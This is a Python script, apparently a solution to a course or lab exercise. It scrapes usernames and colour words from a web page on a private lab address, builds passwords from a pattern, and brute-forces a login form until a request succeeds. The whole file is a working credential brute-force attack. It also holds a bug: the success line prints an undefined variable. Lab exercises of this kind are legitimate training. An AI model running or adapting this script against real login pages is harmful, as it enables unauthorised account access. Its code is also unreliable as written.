#!/usr/bin/python3
import requests # Import library in order to handle HTTP requests and responses.
import subprocess # Import library in order to spawn new OS subprocess (replace for os.spawn and os.system).
from bs4 import BeautifulSoup # Import library for pulling data out of HTML and XML files.

# This python code attemps to solve an exercise from a Python course in which we have to recolect valid credentials in order to bruteforcer a login page. The credentials are stored in an unorganized way in the webpage, so we retrieve the HTML contents and then manipulate it to obtain a valid username and passwords lists to use further.

# We retrieve the main contents of the web page and with it perform a BeautifulSoup object in order to parse it and retrieve interesting data.

ResponseGet = requests.get('http://192.168.114.68:8080/about.html')
Soup = BeautifulSoup(ResponseGet.text, 'lxml')

# The manipulation of the contents depends on what we wanna do. 

TrashList = list(str(Soup.table).split('<tr>'))

Username = "dvaliant@bedlamdynamics.com"

users = ""
colors = ""

for i in range(2,len(TrashList)):
    users += TrashList[i].split('<td>')[1].replace('</td>','').replace('\n','')+","

users +="Brianne"


for i in range(2,len(TrashList)):
    colors += TrashList[i].split('<td>')[4].replace('</td>','').replace('\n','').replace('</tr>','')+","
    
colors += "cyan"
userList = list(users.split(','))
colorList = list(colors.replace('</tbody></table>','').split(','))

for i in range(0,len(userList)):
    for j in range(0,len(colorList)):
        FirstChar = colorList[j][0].swapcase()
        color = FirstChar
        for n in range(1,len(colorList[j])):
            color += colorList[j][n]

        password = userList[i]+color+userList[i]+color

# After manipulare the data in order to create valid passwords according to a scheme we perform a post request and check if the response have the caracteristic error-login message. If don't we print the credentials and exit the program.

        ResponsePost = requests.post('http://192.168.114.68:8080/login-3/index.php', data = {'username': Username,'password': password})
        if not "[ERROR]" in ResponsePost.text:
            print("[+] "+username+":"+password)
            Soup = BeautifulSoup(ResponsePost.text, 'lxml')
            print(Soup.body.div.contents[0].replace('\n',''))
            exit(0)
